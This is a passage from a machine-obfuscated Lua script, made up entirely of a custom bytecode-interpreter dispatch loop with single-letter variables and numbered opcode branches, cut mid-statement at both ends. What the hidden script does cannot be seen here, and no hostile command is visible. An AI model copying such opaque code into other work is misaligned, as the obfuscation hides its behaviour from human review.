c=c+1;e[o]=J[c];end;B=a;d=d+1;o=l[d];e[o[2]][n[o[3]]]=e[o[5]];d=d+1;o=l[d];e[o[2]][n[o[3]]]=n[o[5]];d=d+1;o=l[d];e[o[2]]=f[n[o[3]]];d=d+1;o=l[d];e[o[2]]=e[o[3]][n[o[5]]];d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];A=o[2];D={};c=0;a=A+o[3]-1;for o=A+1,a do c=c+1;D[c]=e[o];end;J={e[A](r(D,1,a-A))};a=A+o[5]-2;c=0;for o=A,a do c=c+1;e[o]=J[c];end;B=a;d=d+1;o=l[d];e[o[2]][n[o[3]]]=e[o[5]];d=d+1;o=l[d];e[o[2]]=f[n[o[3]]];d=d+1;o=l[d];e[o[2]]=e[o[3]][n[o[5]]];d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];e[o[2]]=e[o[3]];d=d+1;o=l[d];A=o[2];D={};c=0;a=A+o[3]-1;for o=A+1,a do c=c+1;D[c]=e[o];end;J={e[A](r(D,1,a-A))};a=A+o[5]-2;c=0;for o=A,a do c=c+1;e[o]=J[c];end;B=a;d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];e[o[2]]=f[n[o[3]]];d=d+1;o=l[d];e[o[2]]=C[o[3]];d=d+1;o=l[d];e[o[2]]=f[n[o[3]]];d=d+1;o=l[d];e[o[2]]=e[o[3]][n[o[5]]];d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];e[o[2]]=C[o[3]];d=d+1;o=l[d];e[o[2]]=#e[o[3]];d=d+1;o=l[d];A=o[2];D={};c=0;a=A+o[3]-1;for o=A+1,a do c=c+1;D[c]=e[o];end;J={e[A](r(D,1,a-A))};a=A+o[5]-2;c=0;for o=A,a do c=c+1;e[o]=J[c];end;B=a;d=d+1;o=l[d];e[o[2]]=e[o[3]][e[o[5]]];d=d+1;o=l[d];A=o[2];D={};c=0;a=A+o[3]-1;for o=A+1,a do c=c+1;D[c]=e[o];end;J={e[A](r(D,1,a-A))};a=A+o[5]-2;c=0;for o=A,a do c=c+1;e[o]=J[c];end;B=a;d=d+1;o=l[d];S=o[3];T=e[S]for o=S+1,o[5]do T=T..e[o];end;e[o[2]]=T;d=d+1;o=l[d];e[o[2]][n[o[3]]]=e[o[5]];d=d+1;o=l[d];e[o[2]][n[o[3]]]=n[o[5]];d=d+1;o=l[d];A=o[2];S=e[o[3]];e[A+1]=S;e[A]=S[n[o[5]]];d=d+1;o=l[d];A=o[2];D={};c=0;a=A+o[3]-1;for o=A+1,a do c=c+1;D[c]=e[o];end;e[A](r(D,1,a-A));B=A;d=d+1;o=l[d];e[o[2]]=C[o[3]];d=d+1;o=l[d];A=o[2];S=e[o[3]];e[A+1]=S;e[A]=S[n[o[5]]];d=d+1;o=l[d];e[o[2]]=e[o[3]];d=d+1;o=l[d];e[o[2]]=e[o[3]][n[o[5]]];d=d+1;o=l[d];A=o[2];D={};c=0;a=A+o[3]-1;for o=A+1,a do c=c+1;D[c]=e[o];end;e[A](r(D,1,a-A));B=A;d=d+1;o=l[d];e[o[2]]=f[n[o[3]]];d=d+1;o=l[d];e[o[2]]=e[o[3]][n[o[5]]];d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];e[o[2]]=e[o[3]];d=d+1;o=l[d];A=o[2];D={};c=0;a=A+o[3]-1;for o=A+1,a do c=c+1;D[c]=e[o];end;J={e[A](r(D,1,a-A))};a=A+o[5]-2;c=0;for o=A,a do c=c+1;e[o]=J[c];end;B=a;d=d+1;o=l[d];e[o[2]]=f[n[o[3]]];d=d+1;o=l[d];e[o[2]]=e[o[3]][n[o[5]]];d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];A=o[2];D={};c=0;a=A+o[3]-1;for o=A+1,a do c=c+1;D[c]=e[o];end;J={e[A](r(D,1,a-A))};a=A+o[5]-2;c=0;for o=A,a do c=c+1;e[o]=J[c];end;B=a;d=d+1;o=l[d];e[o[2]]=e[o[3]][n[o[5]]];d=d+1;o=l[d];e[o[2]][n[o[3]]]=e[o[5]];d=d+1;o=l[d];e[o[2]]=C[o[3]];d=d+1;o=l[d];A=o[2];S=e[o[3]];e[A+1]=S;e[A]=S[n[o[5]]];d=d+1;o=l[d];e[o[2]]=e[o[3]];d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];A=o[2];D={};c=0;a=A+o[3]-1;for o=A+1,a do c=c+1;D[c]=e[o];end;e[A](r(D,1,a-A));B=A;d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];A=o[2];e[A]=e[A]-e[A+2];d=d+o[3];end;elseif c<=147 then e[o[2]]={};elseif c==148 then do return end;else local S;local a;local c;local D;local J;local A;e[o[2]]=C[o[3]];d=d+1;o=l[d];e[o[2]]=e[o[3]][n[o[5]]];d=d+1;o=l[d];A=o[2];J=e[o[3]];e[A+1]=J;e[A]=J[n[o[5]]];d=d+1;o=l[d];A=o[2];D={};c=0;a=A+o[3]-1;for o=A+1,a do c=c+1;D[c]=e[o];end;e[A](r(D,1,a-A));B=A;d=d+1;o=l[d];e[o[2]]=C[o[3]];d=d+1;o=l[d];e[o[2]]=e[o[3]][n[o[5]]];d=d+1;o=l[d];A=o[2];J=e[o[3]];e[A+1]=J;e[A]=J[n[o[5]]];d=d+1;o=l[d];A=o[2];D={};c=0;a=A+o[3]-1;for o=A+1,a do c=c+1;D[c]=e[o];end;e[A](r(D,1,a-A));B=A;d=d+1;o=l[d];e[o[2]]=f[n[o[3]]];d=d+1;o=l[d];e[o[2]]=e[o[3]][n[o[5]]];d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];e[o[2]]=C[o[3]];d=d+1;o=l[d];A=o[2];D={};c=0;a=A+o[3]-1;for o=A+1,a do c=c+1;D[c]=e[o];end;S={e[A](r(D,1,a-A))};a=A+o[5]-2;c=0;for o=A,a do c=c+1;e[o]=S[c];end;B=a;d=d+1;o=l[d];f[n[o[3]]]=e[o[2]];d=d+1;o=l[d];e[o[2]]=f[n[o[3]]];d=d+1;o=l[d];e[o[2]][n[o[3]]]=n[o[5]];d=d+1;o=l[d];e[o[2]]=f[n[o[3]]];d=d+1;o=l[d];e[o[2]]=e[o[3]][n[o[5]]];d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];e[o[2]]=C[o[3]];d=d+1;o=l[d];A=o[2];D={};c=0;a=A+o[3]-1;for o=A+1,a do c=c+1;D[c]=e[o];end;S={e[A](r(D,1,a-A))};a=A+o[5]-2;c=0;for o=A,a do c=c+1;e[o]=S[c];end;B=a;d=d+1;o=l[d];f[n[o[3]]]=e[o[2]];d=d+1;o=l[d];e[o[2]]=f[n[o[3]]];d=d+1;o=l[d];e[o[2]][n[o[3]]]=n[o[5]];d=d+1;o=l[d];e[o[2]]=C[o[3]];d=d+1;o=l[d];e[o[2]]=e[o[3]][n[o[5]]];d=d+1;o=l[d];e[o[2]][n[o[3]]]=n[o[5]];d=d+1;o=l[d];e[o[2]]=C[o[3]];d=d+1;o=l[d];e[o[2]]=e[o[3]][n[o[5]]];d=d+1;o=l[d];e[o[2]][n[o[3]]]=n[o[5]];d=d+1;o=l[d];do return end;end;elseif c<=151 then if c==150 then local J;local D;local a;local c;local C;local A;e[o[2]]=f[n[o[3]]];d=d+1;o=l[d];e[o[2]]=e[o[3]][n[o[5]]];d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];e[o[2]]=f[n[o[3]]];d=d+1;o=l[d];e[o[2]]=e[o[3]][n[o[5]]];d=d+1;o=l[d];e[o[2]]=e[o[3]][n[o[5]]];d=d+1;o=l[d];e[o[2]]=f[n[o[3]]];d=d+1;o=l[d];e[o[2]]=e[o[3]][n[o[5]]];d=d+1;o=l[d];e[o[2]]=e[o[3]][n[o[5]]];d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];A=o[2];C={};c=0;a=A+o[3]-1;for o=A+1,a do c=c+1;C[c]=e[o];end;D={e[A](r(C,1,a-A))};a=A+o[5]-2;c=0;for o=A,a do c=c+1;e[o]=D[c];end;B=a;d=d+1;o=l[d];e[o[2]]={};d=d+1;o=l[d];e[o[2]][n[o[3]]]=n[o[5]];d=d+1;o=l[d];A=o[2];C={};c=0;a=A+o[3]-1;for o=A+1,a do c=c+1;C[c]=e[o];end;D={e[A](r(C,1,a-A))};a=A+o[5]-2;c=0;for o=A,a do c=c+1;e[o]=D[c];end;B=a;d=d+1;o=l[d];A=o[2];J=e[o[3]];e[A+1]=J;e[A]=J[n[o[5]]];d=d+1;o=l[d];A=o[2];C={};c=0;a=A+o[3]-1;for o=A+1,a do c=c+1;C[c]=e[o];end;e[A](r(C,1,a-A));B=A;d=d+1;o=l[d];e[o[2]]=f[n[o[3]]];d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];A=o[2];C={};c=0;a=A+o[3]-1;for o=A+1,a do c=c+1;C[c]=e[o];end;e[A](r(C,1,a-A));B=A;d=d+1;o=l[d];e[o[2]]=e[o[3]][n[o[5]]];d=d+1;o=l[d];e[o[2]]=e[o[3]];d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];e[o[2]]={};d=d+1;o=l[d];e[o[2]][n[o[3]]]=n[o[5]];d=d+1;o=l[d];A=o[2];C={};c=0;a=A+o[3]-1;for o=A+1,a do c=c+1;C[c]=e[o];end;e[A](r(C,1,a-A));B=A;d=d+1;o=l[d];e[o[2]]=e[o[3]][n[o[5]]];d=d+1;o=l[d];e[o[2]]=e[o[3]];d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];e[o[2]]={};d=d+1;o=l[d];e[o[2]][n[o[3]]]=n[o[5]];d=d+1;o=l[d];A=o[2];C={};c=0;a=A+o[3]-1;for o=A+1,a do c=c+1;C[c]=e[o];end;e[A](r(C,1,a-A));B=A;d=d+1;o=l[d];e[o[2]]=e[o[3]][n[o[5]]];d=d+1;o=l[d];e[o[2]]=e[o[3]];d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];e[o[2]]={};d=d+1;o=l[d];e[o[2]][n[o[3]]]=n[o[5]];d=d+1;o=l[d];A=o[2];C={};c=0;a=A+o[3]-1;for o=A+1,a do c=c+1;C[c]=e[o];end;e[A](r(C,1,a-A));B=A;d=d+1;o=l[d];e[o[2]]=e[o[3]][n[o[5]]];d=d+1;o=l[d];e[o[2]]=e[o[3]];d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];e[o[2]]={};d=d+1;o=l[d];e[o[2]][n[o[3]]]=n[o[5]];d=d+1;o=l[d];A=o[2];C={};c=0;a=A+o[3]-1;for o=A+1,a do c=c+1;C[c]=e[o];end;e[A](r(C,1,a-A));B=A;d=d+1;o=l[d];if e[o[2]]then d=d+1;else d=d+o[3];end;else local f;local A;local c;local B;e[o[2]]=e[o[3]]*e[o[5]];d=d+1;o=l[d];e[o[2]]=e[o[3]][n[o[5]]];d=d+1;o=l[d];e[o[2]]=e[o[3]]*e[o[5]];d=d+1;o=l[d];e[o[2]]=e[o[3]]+e[o[5]];d=d+1;o=l[d];e[o[2]]=e[o[3]][n[o[5]]];d=d+1;o=l[d];e[o[2]]=e[o[3]]*e[o[5]];d=d+1;o=l[d];e[o[2]]=e[o[3]][n[o[5]]];d=d+1;o=l[d];e[o[2]]=e[o[3]]*e[o[5]];d=d+1;o=l[d];e[o[2]]=e[o[3]]+e[o[5]];d=d+1;o=l[d];e[o[2]]=e[o[3]][n[o[5]]];d=d+1;o=l[d];e[o[2]]=e[o[3]]*e[o[5]];d=d+1;o=l[d];e[o[2]]=e[o[3]][n[o[5]]];d=d+1;o=l[d];e[o[2]]=e[o[3]]*e[o[5]];d=d+1;o=l[d];e[o[2]]=e[o[3]]+e[o[5]];d=d+1;o=l[d];e[o[2]]=e[o[3]][n[o[5]]];d=d+1;o=l[d];e[o[2]]=e[o[3]]*e[o[5]];d=d+1;o=l[d];e[o[2]]=e[o[3]][n[o[5]]];d=d+1;o=l[d];e[o[2]]=e[o[3]]*e[o[5]];d=d+1;o=l[d];e[o[2]]=e[o[3]]+e[o[5]];d=d+1;o=l[d];B=o[2];c=B+o[3]-2;A={};f=0;for o=B,c do f=f+1;A[f]=e[o];end;do return r(A,1,f)end;d=d+1;o=l[d];do return end;end;elseif c<=152 then local D;local a;local A;local C;local c;e[o[2]]=n[o[3]];d=d+1;o=l[d];e[o[2]]=f[n[o[3]]];d=d+1;o=l[d];e[o[2]]=e[o[3]][n[o[5]]];d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];c=o[2];C={};A=0;a=c+o[3]-1;for o=c+1,a do A=A+1;C[A]=e[o];end;D={e[c](r(C,1,a-c))};a=c+o[5]-2;A=0;for o=c,a do A=A+1;e[o]=D[A];end;B=a;d=d+1;o=l[d];e[o[2]][e[o[3]]]=e[o[5]];d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];e[o[2]]=e[o[3]][e[o[5]]];d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];e[o[2]]=f[n[o[3]]];elseif c==153 then e[o[2]]=e[o[3]]-e[o[5]];else local l=o[2];local f=e[l+2];local n=e[l]+f;e[l]=n;if f>0 then if n<=e[l+1]then d=d+o[3];e[l+3]=n;end;elseif n>=e[l+1]then d=d+o[3];e[l+3]=n;end;end;elseif c<=159 then if c<=156 then if c==155 then if e[o[2]]then d=d+1;else d=d+o[3];end;else local l=o[2];local n=B;local d={};local o=0;for l=l,n do o=o+1;d[o]=e[l];end;do return r(d,1,o)end;end;elseif c<=157 then e[o[2]]=f[n[o[3]]];elseif c==158 then local a;local S;local c;local D;local J;local A;e[o[2]]=C[o[3]];d=d+1;o=l[d];A=o[2];J=e[o[3]];e[A+1]=J;e[A]=J[n[o[5]]];d=d+1;o=l[d];e[o[2]]=f[n[o[3]]];d=d+1;o=l[d];e[o[2]]=e[o[3]][n[o[5]]];d=d+1;o=l[d];e[o[2]]=e[o[3]][n[o[5]]];d=d+1;o=l[d];A=o[2];D={};c=A+o[3]-1;for o=A+1,c do D[#D+1]=e[o];end;do return e[A](r(D,1,c-A))end;d=d+1;o=l[d];A=o[2];c=B;S={};a=0;for o=A,c do a=a+1;S[a]=e[o];end;do return r(S,1,a)end;d=d+1;o=l[d];do return end;else local d=o[2];local l={};local o=d+o[3]-1;for o=d+1,o do l[#l+1]=e[o];end;do return e[d](r(l,1,o-d))end;end;elseif c<=162 then if c<=160 then local J;local a;local c;local C;local D;local A;e[o[2]]=e[o[3]];d=d+1;o=l[d];e[o[2]]();B=A;d=d+1;o=l[d];e[o[2]]=f[n[o[3]]];d=d+1;o=l[d];A=o[2];D=e[o[3]];e[A+1]=D;e[A]=D[n[o[5]]];d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];A=o[2];C={};c=0;a=A+o[3]-1;for o=A+1,a do c=c+1;C[c]=e[o];end;J={e[A](r(C,1,a-A))};a=A+o[5]-2;c=0;for o=A,a do c=c+1;e[o]=J[c];end;B=a;d=d+1;o=l[d];e[o[2]]=e[o[3]][n[o[5]]];d=d+1;o=l[d];A=o[2];D=e[o[3]];e[A+1]=D;e[A]=D[n[o[5]]];d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];A=o[2];C={};c=0;a=A+o[3]-1;for o=A+1,a do c=c+1;C[c]=e[o];end;J={e[A](r(C,1,a-A))};a=A+o[5]-2;c=0;for o=A,a do c=c+1;e[o]=J[c];end;B=a;d=d+1;o=l[d];A=o[2];D=e[o[3]];e[A+1]=D;e[A]=D[n[o[5]]];d=d+1;o=l[d];e[o[2]]=e[o[3]];d=d+1;o=l[d];A=o[2];C={};c=0;a=A+o[3]-1;for o=A+1,a do c=c+1;C[c]=e[o];end;e[A](r(C,1,a-A));B=A;d=d+1;o=l[d];e[o[2]]=f[n[o[3]]];d=d+1;o=l[d];A=o[2];D=e[o[3]];e[A+1]=D;e[A]=D[n[o[5]]];d=d+1;o=l[d];e[o[2]]=f[n[o[3]]];d=d+1;o=l[d];e[o[2]]=e[o[3]][n[o[5]]];d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];A=o[2];C={};c=0;a=A+o[3]-1;for o=A+1,a do c=c+1;C[c]=e[o];end;J={e[A](r(C,1,a-A))};a=A+o[5]-2;c=0;for o=A,a do c=c+1;e[o]=J[c];end;B=a;d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];A=o[2];C={};c=0;a=A+o[3]-1;for o=A+1,a do c=c+1;C[c]=e[o];end;e[A](r(C,1,a-A));B=A;d=d+1;o=l[d];e[o[2]]=f[n[o[3]]];d=d+1;o=l[d];e[o[2]]=f[n[o[3]]];d=d+1;o=l[d];e[o[2]]=e[o[3]][n[o[5]]];d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];A=o[2];C={};c=0;a=A+o[3]-1;for o=A+1,a do c=c+1;C[c]=e[o];end;J={e[A](r(C,1,a-A))};a=A+o[5]-2;c=0;for o=A,a do c=c+1;e[o]=J[c];end;B=a;d=d+1;o=l[d];e[o[2]][n[o[3]]]=e[o[5]];d=d+1;o=l[d];e[o[2]]=f[n[o[3]]];d=d+1;o=l[d];A=o[2];D=e[o[3]];e[A+1]=D;e[A]=D[n[o[5]]];d=d+1;o=l[d];e[o[2]]=f[n[o[3]]];d=d+1;o=l[d];e[o[2]]=e[o[3]][n[o[5]]];d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];A=o[2];C={};c=0;a=A+o[3]-1;for o=A+1,a do c=c+1;C[c]=e[o];end;J={e[A](r(C,1,a-A))};a=A+o[5]-2;c=0;for o=A,a do c=c+1;e[o]=J[c];end;B=a;d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];A=o[2];C={};c=0;a=A+o[3]-1;for o=A+1,a do c=c+1;C[c]=e[o];end;e[A](r(C,1,a-A));B=A;d=d+1;o=l[d];e[o[2]]=f[n[o[3]]];d=d+1;o=l[d];e[o[2]]();B=A;d=d+1;o=l[d];e[o[2]]=f[n[o[3]]];d=d+1;o=l[d];A=o[2];D=e[o[3]];e[A+1]=D;e[A]=D[n[o[5]]];d=d+1;o=l[d];e[o[2]]=f[n[o[3]]];d=d+1;o=l[d];e[o[2]]=e[o[3]][n[o[5]]];d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];A=o[2];C={};c=0;a=A+o[3]-1;for o=A+1,a do c=c+1;C[c]=e[o];end;J={e[A](r(C,1,a-A))};a=A+o[5]-2;c=0;for o=A,a do c=c+1;e[o]=J[c];end;B=a;d=d+1;o=l[d];e[o[2]]=f[n[o[3]]];d=d+1;o=l[d];e[o[2]]=e[o[3]][n[o[5]]];d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];A=o[2];C={};c=0;a=A+o[3]-1;for o=A+1,a do c=c+1;C[c]=e[o];end;J={e[A](r(C,1,a-A))};a=A+o[5]-2;c=0;for o=A,a do c=c+1;e[o]=J[c];end;B=a;d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];A=o[2];C={};c=0;a=A+o[3]-1;for o=A+1,a do c=c+1;C[c]=e[o];end;e[A](r(C,1,a-A));B=A;d=d+1;o=l[d];e[o[2]]=f[n[o[3]]];d=d+1;o=l[d];A=o[2];D=e[o[3]];e[A+1]=D;e[A]=D[n[o[5]]];d=d+1;o=l[d];A=o[2];C={};c=0;a=A+o[3]-1;for o=A+1,a do c=c+1;C[c]=e[o];end;e[A](r(C,1,a-A));B=A;d=d+1;o=l[d];e[o[2]]=f[n[o[3]]];d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];A=o[2];C={};c=0;a=A+o[3]-1;for o=A+1,a do c=c+1;C[c]=e[o];end;e[A](r(C,1,a-A));B=A;d=d+1;o=l[d];e[o[2]]=f[n[o[3]]];d=d+1;o=l[d];e[o[2]]=e[o[3]][n[o[5]]];d=d+1;o=l[d];e[o[2]]=e[o[3]][n[o[5]]];d=d+1;o=l[d];e[o[2]]=f[n[o[3]]];d=d+1;o=l[d];e[o[2]]=e[o[3]][n[o[5]]];elseif c==161 then local c;local A;local a;local f;e[o[2]]=C[o[3]];d=d+1;o=l[d];e[o[2]]=e[o[3]][n[o[5]]];d=d+1;o=l[d];e[o[2]]=C[o[3]];d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];e[o[2]]={};d=d+1;o=l[d];e[o[2]]=C[o[3]];d=d+1;o=l[d];e[o[2]][n[o[3]]]=e[o[5]];d=d+1;o=l[d];f=o[2];a={};A=0;c=f+o[3]-1;for o=f+1,c do A=A+1;a[A]=e[o];end;e[f](r(a,1,c-f));B=f;d=d+1;o=l[d];do return end;else local D;local a;local A;local C;local c;c=o[2];C={};A=0;a=c+o[3]-1;for o=c+1,a do A=A+1;C[A]=e[o];end;D={e[c](r(C,1,a-c))};a=c+o[5]-2;A=0;for o=c,a do A=A+1;e[o]=D[A];end;B=a;d=d+1;o=l[d];e[o[2]][n[o[3]]]=e[o[5]];d=d+1;o=l[d];e[o[2]][n[o[3]]]=n[o[5]];d=d+1;o=l[d];e[o[2]][n[o[3]]]=e[o[5]];d=d+1;o=l[d];e[o[2]]=f[n[o[3]]];d=d+1;o=l[d];e[o[2]]=e[o[3]][n[o[5]]];d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];c=o[2];C={};A=0;a=c+o[3]-1;for o=c+1,a do A=A+1;C[A]=e[o];end;D={e[c](r(C,1,a-c))};a=c+o[5]-2;A=0;for o=c,a do A=A+1;e[o]=D[A];end;B=a;d=d+1;o=l[d];e[o[2]][n[o[3]]]=e[o[5]];d=d+1;o=l[d];e[o[2]][n[o[3]]]=n[o[5]];d=d+1;o=l[d];e[o[2]][n[o[3]]]=n[o[5]];d=d+1;o=l[d];e[o[2]]=f[n[o[3]]];d=d+1;o=l[d];e[o[2]]=e[o[3]][n[o[5]]];d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];c=o[2];C={};A=0;a=c+o[3]-1;for o=c+1,a do A=A+1;C[A]=e[o];end;D={e[c](r(C,1,a-c))};a=c+o[5]-2;A=0;for o=c,a do A=A+1;e[o]=D[A];end;B=a;d=d+1;o=l[d];e[o[2]][n[o[3]]]=e[o[5]];d=d+1;o=l[d];e[o[2]]=f[n[o[3]]];d=d+1;o=l[d];e[o[2]]=e[o[3]][n[o[5]]];d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];c=o[2];C={};A=0;a=c+o[3]-1;for o=c+1,a do A=A+1;C[A]=e[o];end;D={e[c](r(C,1,a-c))};a=c+o[5]-2;A=0;for o=c,a do A=A+1;e[o]=D[A];end;B=a;d=d+1;o=l[d];e[o[2]][n[o[3]]]=e[o[5]];d=d+1;o=l[d];e[o[2]][n[o[3]]]=n[o[5]];d=d+1;o=l[d];e[o[2]][n[o[3]]]=n[o[5]];d=d+1;o=l[d];e[o[2]]=f[n[o[3]]];d=d+1;o=l[d];e[o[2]]=e[o[3]][n[o[5]]];d=d+1;o=l[d];e[o[2]]=e[o[3]][n[o[5]]];d=d+1;o=l[d];e[o[2]][n[o[3]]]=e[o[5]];d=d+1;o=l[d];e[o[2]]=f[n[o[3]]];d=d+1;o=l[d];e[o[2]]=e[o[3]][n[o[5]]];d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];c=o[2];C={};A=0;a=c+o[3]-1;for o=c+1,a do A=A+1;C[A]=e[o];end;D={e[c](r(C,1,a-c))};a=c+o[5]-2;A=0;for o=c,a do A=A+1;e[o]=D[A];end;B=a;d=d+1;o=l[d];e[o[2]][n[o[3]]]=e[o[5]];d=d+1;o=l[d];e[o[2]][n[o[3]]]=n[o[5]];d=d+1;o=l[d];e[o[2]][n[o[3]]]=e[o[5]];d=d+1;o=l[d];e[o[2]]=f[n[o[3]]];d=d+1;o=l[d];e[o[2]]=e[o[3]][n[o[5]]];d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];c=o[2];C={};A=0;a=c+o[3]-1;for o=c+1,a do A=A+1;C[A]=e[o];end;D={e[c](r(C,1,a-c))};a=c+o[5]-2;A=0;for o=c,a do A=A+1;e[o]=D[A];end;B=a;d=d+1;o=l[d];e[o[2]][n[o[3]]]=e[o[5]];d=d+1;o=l[d];e[o[2]]=f[n[o[3]]];d=d+1;o=l[d];e[o[2]]=e[o[3]][n[o[5]]];d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];c=o[2];C={};A=0;a=c+o[3]-1;for o=c+1,a do A=A+1;C[A]=e[o];end;D={e[c](r(C,1,a-c))};a=c+o[5]-2;A=0;for o=c,a do A=A+1;e[o]=D[A];end;B=a;d=d+1;o=l[d];e[o[2]][n[o[3]]]=e[o[5]];d=d+1;o=l[d];e[o[2]][n[o[3]]]=n[o[5]];d=d+1;o=l[d];e[o[2]][n[o[3]]]=n[o[5]];d=d+1;o=l[d];e[o[2]]=f[n[o[3]]];d=d+1;o=l[d];e[o[2]]=e[o[3]][n[o[5]]];d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];c=o[2];C={};A=0;a=c+o[3]-1;for o=c+1,a do A=A+1;C[A]=e[o];end;D={e[c](r(C,1,a-c))};a=c+o[5]-2;A=0;for o=c,a do A=A+1;e[o]=D[A];end;B=a;d=d+1;o=l[d];e[o[2]][n[o[3]]]=e[o[5]];d=d+1;o=l[d];e[o[2]][n[o[3]]]=n[o[5]];d=d+1;o=l[d];e[o[2]]=f[n[o[3]]];d=d+1;o=l[d];e[o[2]]=e[o[3]][n[o[5]]];d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];c=o[2];C={};A=0;a=c+o[3]-1;for o=c+1,a do A=A+1;C[A]=e[o];end;D={e[c](r(C,1,a-c))};a=c+o[5]-2;A=0;for o=c,a do A=A+1;e[o]=D[A];end;B=a;d=d+1;o=l[d];e[o[2]][n[o[3]]]=e[o[5]];d=d+1;o=l[d];e[o[2]][n[o[3]]]=n[o[5]];d=d+1;o=l[d];e[o[2]][n[o[3]]]=e[o[5]];d=d+1;o=l[d];e[o[2]]=f[n[o[3]]];d=d+1;o=l[d];e[o[2]]=e[o[3]][n[o[5]]];end;elseif c<=163 then f[n[o[3]]]=e[o[2]];elseif c==164 then local l=o[2];e[l]=e[l]-e[l+2];d=d+o[3];else e[o[2]]=e[o[3]]*e[o[5]];end;elseif c<=248 then if c<=206 then if c<=185 then if c<=175 then if c<=170 then if c<=167 then if c==166 then local A;local C;local a;local D,c;local 